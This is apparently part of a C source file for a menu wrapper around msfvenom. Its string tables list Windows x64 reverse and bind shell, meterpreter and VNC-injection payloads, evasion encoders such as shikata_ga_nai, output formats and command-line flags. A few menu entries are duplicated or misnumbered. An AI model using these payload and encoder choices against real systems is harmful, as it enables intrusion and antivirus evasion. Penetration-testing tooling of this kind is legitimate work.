char 	tbl_payloadwindowsx64_36[]  	= "  [36]  payload/windows/x64/shell/reverse_tcp_rc4                                    normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsx64_37[]  	= "  [37]  payload/windows/x64/shell/reverse_tcp_uuid                                   normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)\n"; 
char 	tbl_payloadwindowsx64_38[]  	= "  [38]  payload/windows/x64/shell_bind_tcp                                           normal  No     Windows x64 Command Shell, Bind TCP Inline\n"; 
char 	tbl_payloadwindowsx64_39[]  	= "  [39]  payload/windows/x64/shell_reverse_tcp                                        normal  No     Windows x64 Command Shell, Reverse TCP Inline\n"; 
char 	tbl_payloadwindowsx64_40[]  	= "  [40]  payload/windows/x64/vncinject/bind_ipv6_tcp                                  normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager\n"; 
char 	tbl_payloadwindowsx64_41[]  	= "  [41]  payload/windows/x64/vncinject/bind_ipv6_tcp_uuid                             normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsx64_42[]  	= "  [42]  payload/windows/x64/vncinject/bind_named_pipe                                normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsx64_43[]  	= "  [43]  payload/windows/x64/vncinject/bind_tcp                                       normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager\n"; 
char 	tbl_payloadwindowsx64_44[]  	= "  [44]  payload/windows/x64/vncinject/bind_tcp_rc4                                   normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsx64_45[]  	= "  [45]  payload/windows/x64/vncinject/bind_tcp_uuid                                  normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)\n"; 
char 	tbl_payloadwindowsx64_46[]  	= "  [46]  payload/windows/x64/vncinject/reverse_http                                   normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)\n"; 
char 	tbl_payloadwindowsx64_47[]  	= "  [47]  payload/windows/x64/vncinject/reverse_https                                  normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)\n"; 
char 	tbl_payloadwindowsx64_48[]  	= "  [48]  payload/windows/x64/vncinject/reverse_tcp                                    normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsx64_49[]  	= "  [49]  payload/windows/x64/vncinject/reverse_tcp_rc4                                normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsx64_50[]  	= "  [50]  payload/windows/x64/vncinject/reverse_tcp_uuid                               normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)\n"; 
char 	tbl_payloadwindowsx64_51[]  	= "  [51]  payload/windows/x64/vncinject/reverse_winhttp                                normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)\n"; 
char 	tbl_payloadwindowsx64_52[]  	= "  [52]  payload/windows/x64/vncinject/reverse_winhttps                               normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)\n"; 
char 	tbl_payloadwindowsx64_53[]  	= "\n   -    ---- \n";  

char 	payloadwindowsx64_1[]  	= "windows/x64/encrypted_shell/reverse_tcp";
char 	payloadwindowsx64_2[]  	= "windows/x64/encrypted_shell_reverse_tcp";
char 	payloadwindowsx64_3[]  	= "windows/x64/exec";
char 	payloadwindowsx64_4[]  	= "windows/x64/loadlibrary";
char 	payloadwindowsx64_5[]  	= "windows/x64/messagebox";
char 	payloadwindowsx64_6[]  	= "windows/x64/meterpreter/bind_ipv6_tcp";
char 	payloadwindowsx64_7[]  	= "windows/x64/meterpreter/bind_ipv6_tcp_uuid";
char 	payloadwindowsx64_8[]  	= "windows/x64/meterpreter/bind_named_pipe";
char 	payloadwindowsx64_9[]  	= "windows/x64/meterpreter/bind_tcp";
char 	payloadwindowsx64_10[]  = "windows/x64/meterpreter/bind_tcp_rc4";
char 	payloadwindowsx64_11[]  = "windows/x64/meterpreter/bind_tcp_uuid";
char 	payloadwindowsx64_12[]  = "windows/x64/meterpreter/reverse_http";
char 	payloadwindowsx64_13[]  = "windows/x64/meterpreter/reverse_https";
char 	payloadwindowsx64_14[]  = "windows/x64/meterpreter/reverse_named_pipe";
char 	payloadwindowsx64_15[]  = "windows/x64/meterpreter/reverse_tcp";
char 	payloadwindowsx64_16[]  = "windows/x64/meterpreter/reverse_tcp_rc4";
char 	payloadwindowsx64_17[]  = "windows/x64/meterpreter/reverse_tcp_uuid";
char 	payloadwindowsx64_18[]  = "windows/x64/meterpreter/reverse_winhttp";
char 	payloadwindowsx64_19[]  = "windows/x64/meterpreter/reverse_winhttps";
char 	payloadwindowsx64_20[]  = "windows/x64/meterpreter_bind_named_pipe";
char 	payloadwindowsx64_21[]  = "windows/x64/meterpreter_bind_tcp";
char 	payloadwindowsx64_22[]  = "windows/x64/meterpreter_reverse_http";
char 	payloadwindowsx64_23[]  = "windows/x64/meterpreter_reverse_https";
char 	payloadwindowsx64_24[]  = "windows/x64/meterpreter_reverse_ipv6_tcp";
char 	payloadwindowsx64_25[]  = "windows/x64/meterpreter_reverse_tcp";
char 	payloadwindowsx64_26[]  = "windows/x64/pingback_reverse_tcp";
char 	payloadwindowsx64_27[]  = "windows/x64/powershell_bind_tcp";
char 	payloadwindowsx64_28[]  = "windows/x64/powershell_reverse_tcp"; 
char 	payloadwindowsx64_29[]  = "windows/x64/shell/bind_ipv6_tcp";
char 	payloadwindowsx64_30[]  = "windows/x64/shell/bind_ipv6_tcp_uuid";
char 	payloadwindowsx64_31[]  = "windows/x64/shell/bind_named_pipe";
char 	payloadwindowsx64_32[]  = "windows/x64/shell/bind_tcp";
char 	payloadwindowsx64_33[]  = "windows/x64/shell/bind_tcp_rc4";
char 	payloadwindowsx64_34[]  = "windows/x64/shell/bind_tcp_uuid";
char 	payloadwindowsx64_35[]  = "windows/x64/shell/reverse_tcp";
char 	payloadwindowsx64_36[]  = "windows/x64/shell/reverse_tcp_rc4";
char 	payloadwindowsx64_37[]  = "windows/x64/shell/reverse_tcp_uuid";
char 	payloadwindowsx64_38[]  = "windows/x64/shell_bind_tcp"; 
char 	payloadwindowsx64_39[]  = "windows/x64/shell_reverse_tcp";
char 	payloadwindowsx64_40[]  = "windows/x64/vncinject/bind_ipv6_tcp";
char 	payloadwindowsx64_41[]  = "windows/x64/vncinject/bind_ipv6_tcp_uuid";
char 	payloadwindowsx64_42[]  = "windows/x64/vncinject/bind_named_pipe";
char 	payloadwindowsx64_43[]  = "windows/x64/vncinject/bind_tcp";
char 	payloadwindowsx64_44[]  = "windows/x64/vncinject/bind_tcp_rc4";
char 	payloadwindowsx64_45[]  = "windows/x64/vncinject/bind_tcp_uuid";
char 	payloadwindowsx64_46[]  = "windows/x64/vncinject/reverse_http";
char 	payloadwindowsx64_47[]  = "windows/x64/vncinject/reverse_https";
char 	payloadwindowsx64_48[]  = "windows/x64/vncinject/reverse_tcp";
char 	payloadwindowsx64_49[]  = "windows/x64/vncinject/reverse_tcp_rc4";
char 	payloadwindowsx64_50[]  = "windows/x64/vncinject/reverse_tcp_uuid";
char 	payloadwindowsx64_51[]  = "windows/x64/vncinject/reverse_winhttp";
char 	payloadwindowsx64_52[]  = "windows/x64/vncinject/reverse_winhttps";  


// tableau de type d'encoder
char 	tbl_payloadEncodersentete[] = "Framework Encoders\n==================\n\n       Name                          Rank       Description\n       ----                          ----       -----------\n";
char 	tbl_payloadEncoder_str[] 	= "Selecte your encoder : "; 
char 	tbl_payloadEncoder_0[]  	= " [0]   Exit\n"; 
char 	tbl_payloadEncoder_1[]  	= " [1]   cmd/generic_sh                good       Generic Shell Variable Substitution Command Encoder\n"; 
char 	tbl_payloadEncoder_2[]  	= " [2]   cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder\n"; 
char 	tbl_payloadEncoder_3[]  	= " [3]   cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder\n"; 
char 	tbl_payloadEncoder_4[]  	= " [4]   generic/none                  normal     The 'none' Encoder\n"; 
char 	tbl_payloadEncoder_5[]  	= " [5]   mipsbe/longxor                normal     XOR Encoder\n"; 
char 	tbl_payloadEncoder_6[]  	= " [6]   php/base64                    great      PHP Base64 Encoder\n"; 
char 	tbl_payloadEncoder_7[]  	= " [7]   ppc/longxor                   normal     PPC LongXOR Encodern\n"; 
char 	tbl_payloadEncoder_8[]  	= " [8]   ppc/longxor_tag               normal     PPC LongXOR Encoder\n"; 
char 	tbl_payloadEncoder_9[]  	= " [9]   sparc/longxor_tag             normal     SPARC DWORD XOR Encoder\n"; 
char 	tbl_payloadEncoder_10[]  	= " [10]  x64/xor                       normal     XOR Encoder\n"; 
char 	tbl_payloadEncoder_11[]  	= " [11]  x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder\n"; 
char 	tbl_payloadEncoder_12[]  	= " [12]  x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder\n"; 
char 	tbl_payloadEncoder_13[]  	= " [13]  x86/avoid_underscore_tolower  manual     Avoid underscore/tolower\n"; 
char 	tbl_payloadEncoder_14[]  	= " [14]  x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower\n"; 
char 	tbl_payloadEncoder_15[]  	= " [15]  x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder\n"; 
char 	tbl_payloadEncoder_16[]  	= " [16]  x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder\n"; 
char 	tbl_payloadEncoder_17[]  	= " [17]  x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder\n"; 
char 	tbl_payloadEncoder_18[]  	= " [18]  x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder\n"; 
char 	tbl_payloadEncoder_19[]  	= " [19]  x86/context_time              manual     time(2)-based Context Keyed Payload Encoder\n"; 
char 	tbl_payloadEncoder_20[]  	= " [20]  x86/countdown                 normal     Single-byte XOR Countdown Encoder\n"; 
char 	tbl_payloadEncoder_21[]  	= " [21]  x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder\n"; 
char 	tbl_payloadEncoder_22[]  	= " [22]  x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder\n"; 
char 	tbl_payloadEncoder_23[]  	= " [23]  x86/nonalpha                  low        Non-Alpha Encoder\n"; 
char 	tbl_payloadEncoder_24[]  	= " [24]  x86/nonupper                  low        Non-Upper Encoder\n"; 
char 	tbl_payloadEncoder_25[]  	= " [25]  x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder\n"; 
char 	tbl_payloadEncoder_26[]  	= " [26]  x86/single_static_bit         manual     Single Static Bit\n"; 
char 	tbl_payloadEncoder_27[]  	= " [27]  x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder\n"; 
char 	tbl_payloadEncoder_28[]  	= " [28]  x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder\n"; 
char 	tbl_payloadEncoder_29[]  	= "\n   -    ---- \n";   

char 	payloadEncoder_1[]  	= " -e cmd/generic_sh";
char 	payloadEncoder_2[]  	= " -e cmd/ifs";
char 	payloadEncoder_3[]  	= " -e cmd/printf_php_mq";
char 	payloadEncoder_4[]  	= " -e generic/none";
char 	payloadEncoder_5[]  	= " -e mipsbe/longxor";
char 	payloadEncoder_6[]  	= " -e php/base64";
char 	payloadEncoder_7[]  	= " -e ppc/longxor";
char 	payloadEncoder_8[]  	= " -e ppc/longxor_tag";
char 	payloadEncoder_9[]  	= " -e sparc/longxor_tag";
char 	payloadEncoder_10[]  	= " -e x64/xor";
char 	payloadEncoder_11[]  	= " -e x86/alpha_mixed";
char 	payloadEncoder_12[]  	= " -e x86/alpha_upper";
char 	payloadEncoder_13[]  	= " -e x86/avoid_underscore_tolower";
char 	payloadEncoder_14[]  	= " -e x86/avoid_utf8_tolower";
char 	payloadEncoder_15[]  	= " -e x86/bloxor";
char 	payloadEncoder_16[]  	= " -e x86/call4_dword_xor";
char 	payloadEncoder_17[]  	= " -e x86/context_cpuid";
char 	payloadEncoder_18[]  	= " -e x86/context_stat";
char 	payloadEncoder_19[]  	= " -e x86/context_time";
char 	payloadEncoder_20[]  	= " -e x86/countdown";
char 	payloadEncoder_21[]  	= " -e x86/fnstenv_mov";
char 	payloadEncoder_22[]  	= " -e x86/jmp_call_additive";
char 	payloadEncoder_23[]  	= " -e x86/nonalpha";
char 	payloadEncoder_24[]  	= " -e x86/nonupper";
char 	payloadEncoder_25[]  	= " -e x86/shikata_ga_nai";
char 	payloadEncoder_26[]  	= " -e x86/single_static_bit";
char 	payloadEncoder_27[]  	= " -e x86/unicode_mixed";
char 	payloadEncoder_28[]  	= " -e x86/unicode_upper";


// tableau de formats exécutable
char 	tbl_payloadExeFormatsentete[]   = "Framework Executable Formats\n=============================\n\n       Name\n       ----\n";
char 	tbl_payloadExeFormats_str[] 	= "Selecte your executable formats : "; 
char 	tbl_payloadExeFormats_0[]  	= " [0]   Exit\n"; 
char 	tbl_payloadExeFormats_1[]  	= " [1]   asp\n"; 
char 	tbl_payloadExeFormats_2[]  	= " [2]   aspx\n"; 
char 	tbl_payloadExeFormats_3[]  	= " [3]   aspx-exe\n"; 
char 	tbl_payloadExeFormats_4[]  	= " [4]   axis2\n"; 
char 	tbl_payloadExeFormats_5[]  	= " [5]   bash\n"; 
char 	tbl_payloadExeFormats_6[]  	= " [6]   c\n"; 
char 	tbl_payloadExeFormats_7[]  	= " [7]   csharp\n"; 
char 	tbl_payloadExeFormats_8[]  	= " [8]   axis2\n"; 
char 	tbl_payloadExeFormats_9[]  	= " [9]   dll\n"; 
char 	tbl_payloadExeFormats_10[]  	= " [10]  dw\n"; 
char 	tbl_payloadExeFormats_11[]  	= " [11]  dword\n"; 
char 	tbl_payloadExeFormats_12[]  	= " [12]  elf\n"; 
char 	tbl_payloadExeFormats_13[]  	= " [12]  elf-so\n"; 
char 	tbl_payloadExeFormats_14[]  	= " [14]  exe\n"; 
char 	tbl_payloadExeFormats_15[]  	= " [15]  exe-only\n"; 
char 	tbl_payloadExeFormats_16[]  	= " [16]  exe-service\n"; 
char 	tbl_payloadExeFormats_17[]  	= " [17]  exe-small\n"; 
char 	tbl_payloadExeFormats_18[]  	= " [18]  hta-psh\n"; 
char 	tbl_payloadExeFormats_19[]  	= " [19]  hex\n"; 
char 	tbl_payloadExeFormats_20[]  	= " [20]  jar\n"; 
char 	tbl_payloadExeFormats_21[]  	= " [21]  java\n"; 
char 	tbl_payloadExeFormats_22[]  	= " [22]  js_ba\n"; 
char 	tbl_payloadExeFormats_23[]  	= " [23]  js_le\n";
char 	tbl_payloadExeFormats_24[]  	= " [24]  jsp\n"; 
char 	tbl_payloadExeFormats_25[]  	= " [25]  loop-vbs\n"; 
char 	tbl_payloadExeFormats_26[]  	= " [26]  macho\n"; 
char 	tbl_payloadExeFormats_27[]  	= " [27]  msi\n"; 
char 	tbl_payloadExeFormats_28[]  	= " [28]  msi-nouac\n"; 
char 	tbl_payloadExeFormats_29[]  	= " [29]  num\n"; 
char 	tbl_payloadExeFormats_30[]  	= " [30]  osx-app\n"; 
char 	tbl_payloadExeFormats_31[]  	= " [31]  perl\n"; 
char 	tbl_payloadExeFormats_32[]  	= " [32]  pl\n"; 
char 	tbl_payloadExeFormats_33[]  	= " [33]  powershell\n"; 
char 	tbl_payloadExeFormats_34[]  	= " [34]  ps1\n"; 
char 	tbl_payloadExeFormats_35[]  	= " [35]  psh\n"; 
char 	tbl_payloadExeFormats_36[]  	= " [36]  psh-cmd\n"; 
char 	tbl_payloadExeFormats_37[]  	= " [37]  psh-net\n"; 
char 	tbl_payloadExeFormats_38[]  	= " [38]  psh-reflection\n"; 
char 	tbl_payloadExeFormats_39[]  	= " [39]  py\n"; 

char 	tbl_payloadExeFormats_40[]  	= " [40]  python\n"; 
char 	tbl_payloadExeFormats_41[]  	= " [41]  raw\n"; 
char 	tbl_payloadExeFormats_42[]  	= " [42]  rb\n"; 
char 	tbl_payloadExeFormats_43[]  	= " [43]  ruby\n"; 
char 	tbl_payloadExeFormats_44[]  	= " [44]  rsh\n"; 
char 	tbl_payloadExeFormats_45[]  	= " [45]  vba\n"; 
char 	tbl_payloadExeFormats_46[]  	= " [46]  vba-exe\n"; 
char 	tbl_payloadExeFormats_47[]  	= " [47]  vba-psh\n"; 
char 	tbl_payloadExeFormats_48[]  	= " [48]  vbapplication\n"; 
char 	tbl_payloadExeFormats_49[]  	= " [49]  vbs\n"; 
char 	tbl_payloadExeFormats_50[]  	= " [50]  vbscript\n"; 
char 	tbl_payloadExeFormats_51[]  	= " [51]  war\n"; 
char 	tbl_payloadExeFormats_52[]  	= "       ----\n"; 

char 	payloadExeFormats_1[]  		= " --smallest -k -f asp"; 
char 	payloadExeFormats_2[]  		= " --smallest -k -f aspx"; 
char 	payloadExeFormats_3[]  		= " --smallest -k -f aspx-exe"; 
char 	payloadExeFormats_4[]  		= " --smallest -k -f axis2"; 
char 	payloadExeFormats_5[]  		= " --smallest -k -f bash"; 
char 	payloadExeFormats_6[]  		= " --smallest -k -f cn"; 
char 	payloadExeFormats_7[]  		= " --smallest -k -f csharp"; 
char 	payloadExeFormats_8[]  		= " --smallest -k -f axis2"; 
char 	payloadExeFormats_9[]  		= " --smallest -k -f dll"; 
char 	payloadExeFormats_10[]  	= " --smallest -k -f dw"; 
char 	payloadExeFormats_11[]  	= " --smallest -k -f dword"; 
char 	payloadExeFormats_12[]  	= " --smallest -k -f elf"; 
char 	payloadExeFormats_13[]  	= " --smallest -k -f elf-so"; 
char 	payloadExeFormats_14[]  	= " --smallest -k -f exe"; 
char 	payloadExeFormats_15[]  	= " --smallest -k -f exe-only"; 
char 	payloadExeFormats_16[]  	= " --smallest -k -f exe-service"; 
char 	payloadExeFormats_17[]  	= " --smallest -k -f exe-small"; 
char 	payloadExeFormats_18[]  	= " --smallest -k -f hta-psh"; 
char 	payloadExeFormats_19[]  	= " --smallest -k -f hex"; 
char 	payloadExeFormats_20[]  	= " --smallest -k -f jar"; 
char 	payloadExeFormats_21[]  	= " --smallest -k -f java"; 
char 	payloadExeFormats_22[]  	= " --smallest -k -f js_ba"; 
char 	payloadExeFormats_23[]  	= " --smallest -k -f js_le";
char 	payloadExeFormats_24[]  	= " --smallest -k -f jsp"; 
char 	payloadExeFormats_25[]  	= " --smallest -k -f loop-vbs"; 
char 	payloadExeFormats_26[]  	= " --smallest -k -f macho"; 
char 	payloadExeFormats_27[]  	= " --smallest -k -f msi"; 
char 	payloadExeFormats_28[]  	= " --smallest -k -f msi-nouac"; 
char 	payloadExeFormats_29[]  	= " --smallest -k -f num"; 
char 	payloadExeFormats_30[]  	= " --smallest -k -f osx-app"; 
char 	payloadExeFormats_31[]  	= " --smallest -k -f perl"; 
char 	payloadExeFormats_32[]  	= " --smallest -k -f pl"; 
char 	payloadExeFormats_33[]  	= " --smallest -k -f powershell"; 
char 	payloadExeFormats_34[]  	= " --smallest -k -f ps1"; 
char 	payloadExeFormats_35[]  	= " --smallest -k -f psh"; 
char 	payloadExeFormats_36[]  	= " --smallest -k -f psh-cmd"; 
char 	payloadExeFormats_37[]  	= " --smallest -k -f psh-net"; 
char 	payloadExeFormats_38[]  	= " --smallest -k -f psh-reflection"; 
char 	payloadExeFormats_39[]  	= " --smallest -k -f py"; 
char 	payloadExeFormats_40[]  	= " --smallest -k -f python"; 
char 	payloadExeFormats_41[]  	= " --smallest -k -f raw"; 
char 	payloadExeFormats_42[]  	= " --smallest -k -f rb"; 
char 	payloadExeFormats_43[]  	= " --smallest -k -f ruby"; 
char 	payloadExeFormats_44[]  	= " --smallest -k -f rsh"; 
char 	payloadExeFormats_45[]  	= " --smallest -k -f vba"; 
char 	payloadExeFormats_46[]  	= " --smallest -k -f vba-exe"; 
char 	payloadExeFormats_47[]  	= " --smallest -k -f vba-psh"; 
char 	payloadExeFormats_48[]  	= " --smallest -k -f vbapplication"; 
char 	payloadExeFormats_49[]  	= " --smallest -k -f vbs\n"; 
char 	payloadExeFormats_50[]  	= " --smallest -k -f vbscript\n"; 
char 	payloadExeFormats_51[]  	= " --smallest -k -f war\n"; 


//tableau de choix dans quick
char 	tbl_quickpayload_entete[]  	= " Options:\n =======\n\n";
char	tbl_quickpayload_0[]		= " [0]   Exit\n";
char	tbl_quickpayload_1[]		= " [1]   -a --arch          The architecture to use for --payload and --encoders (use --list archs to list)\n";
char	tbl_quickpayload_2[]		= " [2]   --platform         The platform for --payload (use --list platforms to list)\n";
char	tbl_quickpayload_3[]		= " [3]   -p --payloads      Payload to use (--list payloads to list, --list-options for arguments)\n";
char	tbl_quickpayload_4[]		= " [ ]   LHOST=             IP host listener\n";
char	tbl_quickpayload_5[]		= " [ ]   LPORT=             PORT host listener\n";
char	tbl_quickpayload_6[]		= " [6]   -e --encoder       The encoder to use (use --list encoders to list)\n";
char	tbl_quickpayload_7[]		= " [ ]   -i --iterations    The number of times to encode the payload\n";
char	tbl_quickpayload_8[]		= " [ ]   -n --nopsled       Prepend a nopsled of [length] size on to the payload\n";
char	tbl_quickpayload_9[]		= " [ ]   --smallest         Generate the smallest possible payload using all available encoders\n";
char	tbl_quickpayload_10[]		= " [ ]   -k --keep          Preserve the --template behaviour and inject the payload as a new thread\n";
char	tbl_quickpayload_11[]		= " [11]  -f --format        Output format (use --list formats to list)\n";

char	quickpayload_1[]		= "arch";
char	quickpayload_2[]		= "platforms";
char	quickpayload_3[]		= "payloads";
char	quickpayload_6[]		= "encoder";
char	quickpayload_11[]		= "format";

//msfvenom --list archs
char	msfv_archs_entete_1[]		= "[1]  -a --arch          The architecture to use for --payload and --encoders \n";
char	msfv_archs_entete_2[]		= "============================================================================\n\n";
char	msfv_archs_entete_3[]		= "    Name                Name                Name\n";
char	msfv_archs_entete_4[]		= "    ----                ----                ----\n";
char	msfv_archs_1[]			= "    aarch64             mipsbe              ruby\n";
char	msfv_archs_2[]			= "    armbe               mipsle              sparc\n";
char	msfv_archs_3[]			= "    armle               nodejs              sparc64\n";
char	msfv_archs_4[]			= "    cbea                php                 tty\n";
char	msfv_archs_5[]			= "    cmd                 ppcn                x64\n";
char	msfv_archs_6[]			= "    firefox             ppc64               x86\n";
char	msfv_archs_7[]			= "    java                ppc64le             x86_64\n";
char	msfv_archs_8[]			= "    mips                ppce500v2           zarch\n";
char	msfv_archs_9[]			= "    mips64              python       \n";
char	msfv_archs_10[]			= "    mips64le            r            \n";
char	msfv_archs_11[]			= "    \n\n";
char 	msfv_archs_str[] 		= " To return menu type [0] : "; 


//msfvenom --list platforms
char	msfv_platforms_entete_1[]	= "[2]  --platform         The platform for --payload\n";
char	msfv_platforms_entete_2[]	= "==================================================\n\n";
char	msfv_platforms_entete_3[]	= "    Name                Name                Name\n";
char	msfv_platforms_entete_4[]	= "    ----                ----                ----\n";
char	msfv_platforms_archs_1[]	= "    aix                 irix                osx\n";
char	msfv_platforms_archs_2[]	= "    android             java                php\n";
char	msfv_platforms_archs_3[]	= "    apple_ios           javascript          python\n";
char	msfv_platforms_archs_4[]	= "    brocade             juniper             r\n";
char	msfv_platforms_archs_5[]	= "    bsd                 linux               solaris\n";
char	msfv_platforms_archs_6[]	= "    bsdi                mainframe           unifi\n";
char	msfv_platforms_archs_7[]	= "    cisco               multi               unix\n";
char	msfv_platforms_archs_8[]	= "    firefox             netbsd              unknown\n";
char	msfv_platforms_archs_9[]	= "    freebsd             netware             windows\n";
char	msfv_platforms_archs_10[]	= "    hardware            nodejs\n";
char	msfv_platforms_archs_11[]	= "    hpux                openbsd\n";
char	msfv_platforms_archs_12[]	= "    \n\n";
char 	msfv_platforms_archs_str[] 	= " To return menu type [0] : "; 


//msfvenom --list encoders
char	msfv_encoders_entete_1[]	= "[4]  -e --encoder       The encoder to use\n";
char	msfv_encoders_entete_2[]	= "Framework Encoders [--encoder <value>]\n";
char	msfv_encoders_entete_3[]	= "======================================\n\n";
char	msfv_encoders_entete_4[]	= "    Name                          Rank       Description\n";
char	msfv_encoders_entete_5[]	= "    ----                          ----       -----------\n";
char	msfv_encoders_1[]		= "    cmd/brace                     low        Bash Brace Expansion Command Encoder \n";
char	msfv_encoders_2[]		= "    cmd/echo                      good       Echo Command Encoder \n";
char	msfv_encoders_3[]		= "    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder \n";
char	msfv_encoders_4[]		= "    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder \n";
char	msfv_encoders_5[]		= "    cmd/perl                      normal     Perl Command Encoder \n";
char	msfv_encoders_6[]		= "    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder \n";
char	msfv_encoders_7[]		= "    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder \n";

char	msfv_encoders_8[]		= "    generic/eicar                 manual     The EICAR Encoder \n";
char	msfv_encoders_9[]		= "    generic/none                  normal     The 'none' Encoder \n";

char	msfv_encoders_10[]		= "    mipsbe/byte_xori              normal     Byte XORi Encoder \n";
char	msfv_encoders_11[]		= "    mipsbe/longxor                normal     XOR Encoder \n";
char	msfv_encoders_12[]		= "    mipsle/byte_xori              normal     Byte XORi Encoder \n";
char	msfv_encoders_13[]		= "    mipsle/longxor                normal     XOR Encoder \n";

char	msfv_encoders_14[]		= "    php/base64                    great      PHP Base64 Encoder \n";

char	msfv_encoders_15[]		= "    ppc/longxor                   normal     PPC LongXOR Encoder\n";
char	msfv_encoders_16[]		= "    ppc/longxor_tag               normal     PPC LongXOR Encoder \n";

char	msfv_encoders_17[]		= "    ruby/base64                   great      Ruby Base64 Encoder \n";

char	msfv_encoders_18[]		= "    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder \n";

char	msfv_encoders_19[]		= "    x64/xor                       normal     XOR Encoder \n";
char	msfv_encoders_20[]		= "    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder \n";
char	msfv_encoders_21[]		= "    x64/xor_dynamic               normal     Dynamic key XOR Encoder \n";
char	msfv_encoders_22[]		= "    x64/zutto_dekiru              manual     Zutto Dekiru \n";

char	msfv_encoders_23[]		= "    x86/add_sub                   manual     Add/Sub Encoder \n";
char	msfv_encoders_24[]		= "    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder \n";
char	msfv_encoders_25[]		= "    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder \n";
char	msfv_encoders_26[]		= "    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower \n";
char	msfv_encoders_27[]		= "    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower \n";
char	msfv_encoders_28[]		= "    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder \n";
char	msfv_encoders_29[]		= "    x86/bmp_polyglot              manual     BMP Polyglot \n";
char	msfv_encoders_30[]		= "    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder \n";
char	msfv_encoders_31[]		= "    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder \n";
char	msfv_encoders_32[]		= "    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder \n";
char	msfv_encoders_33[]		= "    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder \n";
char	msfv_encoders_34[]		= "    x86/countdown                 normal     Single-byte XOR Countdown Encoder \n";
char	msfv_encoders_35[]		= "    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder \n";
char	msfv_encoders_36[]		= "    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder \n";
char	msfv_encoders_37[]		= "    x86/nonalpha                  low        Non-Alpha Encoder \n";
char	msfv_encoders_38[]		= "    x86/nonupper                  low        Non-Upper Encoder \n";
char	msfv_encoders_39[]		= "    x86/opt_sub                   manual     Sub Encoder (optimised) \n";
char	msfv_encoders_40[]		= "    x86/service                   manual     Register Service \n";
char	msfv_encoders_41[]		= "    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder \n";
char	msfv_encoders_42[]		= "    x86/single_static_bit         manual     Single Static Bit \n";
char	msfv_encoders_43[]		= "    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder \n";
char	msfv_encoders_44[]		= "    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder \n";
char	msfv_encoders_45[]		= "    x86/xor_dynamic               normal     Dynamic key XOR Encoder \n";
char	msfv_encoders_46[]		= " \n\n";
char 	msfv_encoders_str[] 		= " To return menu type [0] : "; 
  
    
    
//msfvenom --list formats
char	msfv_formats_entete_1[]	= "[7]  -f --format        Output format (use --list formats to list)\n";
char	msfv_formats_entete_2[]	= "==================================================================\n\n";
char	msfv_formats_entete_3[]	= "    Name                Name                Name\n";
char	msfv_formats_entete_4[]	= "    ----                ----                ----\n";
char	msfv_formats_1[]	= "    asp                 hex                 psh-cmd\n";
char	msfv_formats_2[]	= "    aspx                jar                 psh-net\n";
char	msfv_formats_3[]	= "    aspx-exe            java                psh_reflection\n";
char	msfv_formats_4[]	= "    axis2               js_ba               py\n";
char	msfv_formats_5[]	= "    bash                js_le               python\n";
char	msfv_formats_6[]	= "    cn                  jsp                 raw \n";
char	msfv_formats_7[]	= "    csharp              loop-vbs            rb\n";
char	msfv_formats_8[]	= "    dll                 macho               ruby\n";
